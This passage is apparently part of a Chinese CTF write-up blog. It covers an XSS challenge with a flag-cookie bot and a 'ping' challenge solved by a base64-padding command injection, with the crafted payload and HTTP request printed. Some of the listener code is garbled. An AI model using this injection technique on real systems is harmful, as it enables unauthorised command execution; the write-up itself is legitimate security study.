class="string">&#x27;login&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(<span class="title class_ inherited__">UserMixin</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, <span class="built_in">id</span>, username, password, bio=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.<span class="built_in">id</span> = <span class="built_in">id</span></span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.password = password</span><br><span class="line">        <span class="variable language_">self</span>.bio = bio</span><br><span class="line"></span><br><span class="line">admin_password = os.urandom(<span class="number">12</span>).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">USERS_DB = &#123;<span class="string">&#x27;admin&#x27;</span>: User(<span class="built_in">id</span>=<span class="number">1</span>, username=<span class="string">&#x27;admin&#x27;</span>, password=admin_password)&#125;</span><br><span class="line"><span class="built_in">print</span>(admin_password)</span><br><span class="line">USER_ID_COUNTER = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_manager.user_loader</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_user</span>(<span class="params">user_id</span>):</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> USERS_DB.values():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(user.<span class="built_in">id</span>) == user_id:</span><br><span class="line">            <span class="keyword">return</span> user</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">global</span> USER_ID_COUNTER</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> USERS_DB:</span><br><span class="line">            flash(<span class="string">&#x27;Username already exists.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        USER_ID_COUNTER += <span class="number">1</span></span><br><span class="line">        new_user = User(</span><br><span class="line">            <span class="built_in">id</span>=USER_ID_COUNTER,</span><br><span class="line">            username=username,</span><br><span class="line">            password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        )</span><br><span class="line">        USERS_DB[username] = new_user</span><br><span class="line">        login_user(new_user)</span><br><span class="line">        response = make_response(redirect(url_for(<span class="string">&#x27;index&#x27;</span>)))</span><br><span class="line">        response.set_cookie(<span class="string">&#x27;ticket&#x27;</span>, <span class="string">&#x27;your_ticket_value&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        user = USERS_DB.get(username)</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">and</span> user.password == password:</span><br><span class="line">            login_user(user)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">        flash(<span class="string">&#x27;Invalid credentials.&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    logout_user()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        current_user.bio = request.form[<span class="string">&#x27;bio&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(current_user.bio)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;profile.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ticket&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ticket</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        ticket = request.form[<span class="string">&#x27;ticket&#x27;</span>]</span><br><span class="line">        response = make_response(redirect(url_for(<span class="string">&#x27;index&#x27;</span>)))</span><br><span class="line">        response.set_cookie(<span class="string">&#x27;ticket&#x27;</span>, ticket)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;ticket.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/view&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_user</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    # I found a bug in it.</span></span><br><span class="line"><span class="string">    # Until I fix it, I&#x27;ve banned /api/bio/. Have fun :)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    username = request.args.get(<span class="string">&quot;username&quot;</span>,default=current_user.username)</span><br><span class="line">    visit_url(<span class="string">f&quot;http://localhost/api/bio/<span class="subst">&#123;username&#125;</span>&quot;</span>)</span><br><span class="line">    template = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#123;&#123;% extends &quot;base.html&quot; %&#125;&#125;</span></span><br><span class="line"><span class="string">    &#123;&#123;% block title %&#125;&#125;success&#123;&#123;% endblock %&#125;&#125;</span></span><br><span class="line"><span class="string">    &#123;&#123;% block content %&#125;&#125;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;bot will visit your bio&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;p style=&quot;margin-top: 1.5rem;&quot;&gt;&lt;a href=&quot;&#123;&#123;&#123;&#123; url_for(&#x27;index&#x27;) &#125;&#125;&#125;&#125;&quot;&gt;Back to Home&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &#123;&#123;% endblock %&#125;&#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api/bio/&lt;string:username&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_bio</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.username == username:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unauthorized&quot;</span>, <span class="number">401</span></span><br><span class="line">    user = USERS_DB.get(username)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User not found.&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> user.bio</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag_value = os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;flag&#123;fake&#125;&#x27;</span>)</span><br><span class="line">        logger.info(<span class="string">f&quot;Bot started visiting URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        logger.info(<span class="string">f&quot;Bot flag value: <span class="subst">&#123;flag_value&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> p:</span><br><span class="line">            browser = p.chromium.launch(headless=<span class="literal">True</span>, args=[<span class="string">&quot;--no-sandbox&quot;</span>])</span><br><span class="line">            logger.info(<span class="string">&quot;Browser launched successfully&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            context = browser.new_context()</span><br><span class="line">            logger.info(<span class="string">&quot;New browser context created&quot;</span>)</span><br><span class="line"></span><br><span class="line">            context.add_cookies([&#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;value&#x27;</span>: flag_value,</span><br><span class="line">                <span class="string">&#x27;domain&#x27;</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;httponly&#x27;</span>: <span class="literal">True</span></span><br><span class="line">            &#125;])</span><br><span class="line">            logger.info(<span class="string">&quot;Flag cookie added to browser context&quot;</span>)</span><br><span class="line"></span><br><span class="line">            page = context.new_page()</span><br><span class="line">            logger.info(<span class="string">&quot;New page created&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 记录登录过程</span></span><br><span class="line">            logger.info(<span class="string">&quot;Navigating to login page&quot;</span>)</span><br><span class="line">            page.goto(<span class="string">&quot;http://localhost/login&quot;</span>, timeout=<span class="number">5000</span>)</span><br><span class="line">            logger.info(<span class="string">&quot;Login page loaded&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            page.fill(<span class="string">&quot;input[name=&#x27;username&#x27;]&quot;</span>, <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">            logger.info(<span class="string">&quot;Filled admin username&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            page.fill(<span class="string">&quot;input[name=&#x27;password&#x27;]&quot;</span>, admin_password)</span><br><span class="line">            logger.info(<span class="string">&quot;Filled admin password&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            page.click(<span class="string">&quot;input[name=&#x27;submit&#x27;]&quot;</span>)</span><br><span class="line">            logger.info(<span class="string">&quot;Clicked submit button&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            page.wait_for_timeout(<span class="number">3000</span>)</span><br><span class="line">            logger.info(<span class="string">&quot;Waited for login to complete&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 记录访问目标URL</span></span><br><span class="line">            logger.info(<span class="string">f&quot;Navigating to target URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">            page.goto(url, timeout=<span class="number">5000</span>)</span><br><span class="line">            logger.info(<span class="string">&quot;Target URL loaded&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            page.wait_for_timeout(<span class="number">5000</span>)</span><br><span class="line">            logger.info(<span class="string">&quot;Waited for page to fully load&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            browser.close()</span><br><span class="line">            logger.info(<span class="string">&quot;Browser closed successfully&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            logger.info(<span class="string">f&quot;Bot successfully visited URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logger.error(<span class="string">f&quot;Bot error occurred: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Bot error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    logger.info(<span class="string">&quot;Application started&quot;</span>)</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>xss:<br>&#x2F;api&#x2F;bio&#x2F;a<br><img src="/img/_resources/76eef7d6db2150b86f5b8f78960116a6.png" alt="76eef7d6db2150b86f5b8f78960116a6.png"><br>&#x2F;profile<br><img src="/img/_resources/06b320bd4f3da8adcb435ecb779168a5.png" alt="06b320bd4f3da8adcb435ecb779168a5.png"><br>&#x2F;view<br>日志如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">2025-09-15 00:01:21,751 - werkzeug - INFO - 127.0.0.1 - - [15/Sep/2025 00:01:21] &quot;GET / HTTP/1.1&quot; 200 -</span><br><span class="line">2025-09-15 00:01:21,767 - werkzeug - INFO - 127.0.0.1 - - [15/Sep/2025 00:01:21] &quot;GET /static/css/style.css HTTP/1.1&quot; 304 -</span><br><span class="line">2025-09-15 00:01:21,768 - werkzeug - INFO - 127.0.0.1 - - [15/Sep/2025 00:01:21] &quot;GET /static/js/script.js HTTP/1.1&quot; 304 -</span><br><span class="line">2025-09-15 00:01:32,471 - BotMonitor - INFO - Bot started visiting URL: http://localhost/api/bio/a</span><br><span class="line">2025-09-15 00:01:32,471 - BotMonitor - INFO - Bot flag value: flag&#123;fake&#125;</span><br><span class="line">2025-09-15 00:01:32,664 - BotMonitor - INFO - Browser launched successfully</span><br><span class="line">2025-09-15 00:01:32,669 - BotMonitor - INFO - New browser context created</span><br><span class="line">2025-09-15 00:01:32,708 - BotMonitor - INFO - Flag cookie added to browser context</span><br><span class="line">2025-09-15 00:01:32,732 - BotMonitor - INFO - New page created</span><br><span class="line">2025-09-15 00:01:32,732 - BotMonitor - INFO - Navigating to login page</span><br><span class="line">2025-09-15 00:01:32,744 - BotMonitor - INFO - Login page loaded</span><br><span class="line">2025-09-15 00:02:02,766 - BotMonitor - ERROR - Bot error occurred: Page.fill: Timeout 30000ms exceeded.</span><br><span class="line">Call log:</span><br><span class="line">waiting for locator(&quot;input[name=&#x27;username&#x27;]&quot;)</span><br><span class="line"></span><br><span class="line">Bot error: Page.fill: Timeout 30000ms exceeded.</span><br><span class="line">Call log:</span><br><span class="line">waiting for locator(&quot;input[name=&#x27;username&#x27;]&quot;)</span><br><span class="line"></span><br><span class="line">2025-09-15 00:02:02,768 - werkzeug - INFO - 127.0.0.1 - - [15/Sep/2025 00:02:02] &quot;GET /view HTTP/1.1&quot; 200 -</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>所以我们要在服务器上开一个日志服务器，用于接收详细的请求信息：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment"># 配置日志</span></span><br><span class="line">logging.basicConfig(level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before_request</span>():</span><br><span class="line">request.start_time = datetime.now()</span><br><span class="line">http://logging.info(<span class="string">f&#x27;Request started: <span class="subst">&#123;request.method&#125;</span> <span class="subst">&#123;request.url&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after_request</span>(<span class="params">response</span>):</span><br><span class="line">duration = datetime.now() - request.start_time</span><br><span class="line">http://logging.info(<span class="string">f&#x27;Request completed in <span class="subst">&#123;duration.total_seconds()&#125;</span>s with status <span class="subst">&#123;response.status_code&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> response</span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line">app.route(<span class="string">&quot;/&quot;</span>):</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;visited!&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>以上为理论，具体复现后续再做</p>
+<h2 id="2-赛后复现"><a href="#2-赛后复现" class="headerlink" title="2.赛后复现"></a>2.赛后复现</h2><p>1.大致思路同上<br>2.不同点</p>
+<h1 id="ping（100-）"><a href="#ping（100-）" class="headerlink" title="ping（100%）"></a>ping（100%）</h1><h2 id="1-赛时思考"><a href="#1-赛时思考" class="headerlink" title="1.赛时思考"></a>1.赛时思考</h2><p>感觉是绕waf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">def run_ping(ip_base64):</span><br><span class="line">    try:</span><br><span class="line">        decoded_ip = base64.b64decode(ip_base64).decode(&#x27;utf-8&#x27;)</span><br><span class="line">        if not re.match(r&#x27;^\d+\.\d+\.\d+\.\d+$&#x27;, decoded_ip):</span><br><span class="line">            return False</span><br><span class="line">        if decoded_ip.count(&#x27;.&#x27;) != 3:</span><br><span class="line">            return False</span><br><span class="line">        </span><br><span class="line">        if not all(0 &lt;= int(part) &lt; 256 for part in decoded_ip.split(&#x27;.&#x27;)):</span><br><span class="line">            return False</span><br><span class="line">        if not ipaddress.ip_address(decoded_ip):</span><br><span class="line">            return False</span><br><span class="line">        if len(decoded_ip) &gt; 15:</span><br><span class="line">            return False</span><br><span class="line">        if not re.match(r&#x27;^[A-Za-z0-9+/=]+$&#x27;, ip_base64):</span><br><span class="line">            return False</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return False</span><br><span class="line">    command = f&quot;&quot;&quot;echo &quot;ping -c 1 $(echo &#x27;&#123;ip_base64&#125;&#x27; | base64 -d)&quot; | sh&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        process = subprocess.run(</span><br><span class="line">            command,</span><br><span class="line">            shell=True,</span><br><span class="line">            check=True,</span><br><span class="line">            capture_output=True,</span><br><span class="line">            text=True</span><br><span class="line">        )</span><br><span class="line">        return process.stdout</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return False</span><br></pre></td></tr></table></figure>
+
+<h2 id="赛后复现"><a href="#赛后复现" class="headerlink" title="赛后复现"></a>赛后复现</h2><p>在python base64解码时，会出现解码不一致情况，这是因为最后的&#x3D;&#x3D;会是为视为编码的结束点,而终端会直接解码从而造成命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(swordreforge㉿swordreforge)-[~]</span><br><span class="line">└─$ echo &quot;MTE0NTE0O2xzIA==&quot; | base64 -d | sh</span><br><span class="line">sh: 1: 114514: not found</span><br><span class="line"> 公共			       jwt-cracker-4.1.1</span><br><span class="line"> 模板			       jython-standalone-</span><br><span class="line"> 视频			       laravel5.1</span><br><span class="line"> 图片			       laravel-7.3.0</span><br><span class="line"> 文档			       laravel-test</span><br><span class="line"> 下载			       </span><br><span class="line"> 音乐			       PhpstormProjects</span><br><span class="line"> 桌面			       project</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(swordreforge㉿swordreforge)-[~]</span><br><span class="line">└─$ python                               </span><br><span class="line">Python 3.8.0 (default, Sep  5 2025, 19:53:31) </span><br><span class="line">[GCC 14.3.0] on linux</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; import base64</span><br><span class="line">&gt;&gt;&gt; base64.b64decode(&quot;MTE0NTE0&quot;)</span><br><span class="line">b&#x27;114514&#x27;</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">＃1145141;`ls`</span><br><span class="line">base64.b64decode(&quot;MTE0NTE0MQ==O2Bsc2Ag&quot;)</span><br><span class="line">b&#x27;1145141&#x27;#跳过了==后的内容正则会忽略</span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure>
+
+<p>因此：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分别加密两侧,要求第一个padding必须有==</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /ping HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:5000</span><br><span class="line">Content-Length: 40</span><br><span class="line">sec-ch-ua-platform: &quot;Linux&quot;</span><br><span class="line">Content-Type: application/json</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;&quot;ip_base64&quot;:&quot;MS4xLjEuMQ==O2NhdCBmbGFn&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Werkzeug/3.0.6 Python/3.8.0</span><br><span class="line">Date: Mon, 15 Sep 2025 09:11:51 GMT</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 292</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;output&quot;:&quot;PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.\n64 bytes from 1.1.1.1: icmp_seq=1 ttl=52 time=259 ms\n\n--- 1.1.1.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 258.813/258.813/258.813/0.000 ms\nflag&#123;test&#125;&quot;,&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Peek-a-Fork-30"><a href="#Peek-a-Fork-30" class="headerlink" title="Peek a Fork(30%)"></a>Peek a Fork(30%)</h1><p>没搞懂，socket在干啥？？<br>十分的pwn</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">55f0310e0000-55f0310e1000 r--p 00000000 fe:00 10497236                   /home/swordreforge/.pyenv/versions/3.8.0/bin/python3.8</span><br><span class="line">55f0310e1000-55f0310e2000 r-xp 00001000 fe:00 10497236                   /home/swordreforge/.pyenv/versions/3.8.0/bin/python3.8</span><br><span class="line">55f0310e2000-55f0310e3000 r--p 00002000 fe:00 10497236                   /home/swordreforge/.pyenv/versions/3.8.0/bin/python3.8</span><br><span class="line">55f0310e3000-55f0310e4000 r--p 00002000 fe:00 10497236                   /home/swordreforge/.pyenv/versions/3.8.0/bin/python3.8</span><br><span class="line">55f0310e4000-55f0310e5000 rw-p 00003000 fe:00 10497236                   /home/swordreforge/.pyenv/versions/3.8.0/bin/python3.8</span><br><span 